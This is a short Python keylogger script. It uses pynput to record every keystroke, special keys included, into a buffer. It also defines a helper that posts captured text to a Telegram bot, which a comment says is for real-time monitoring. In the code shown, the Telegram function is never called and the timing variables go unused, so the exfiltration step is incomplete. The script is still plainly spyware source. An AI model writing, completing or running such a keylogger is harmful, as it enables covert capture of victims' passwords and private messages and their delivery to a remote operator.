from pynput import keyboard
import time
import requests

# instead of email, use telegram instead for real time monitoring
def send_to_telegram(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=payload)
    except:
        print(f"Error sending message to Telegram")

# buffer to store key logs to increase performance
log_buffer = []

# time variables for delay
SEND_INTERVAL = 0
last_sent_time = time.time()

def key_pressed(key):
    try:
        char = key.char
        if char:
            log_buffer.append(char)
    except AttributeError:
        special_key = f"[{key}]"
        log_buffer.append(special_key)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()  

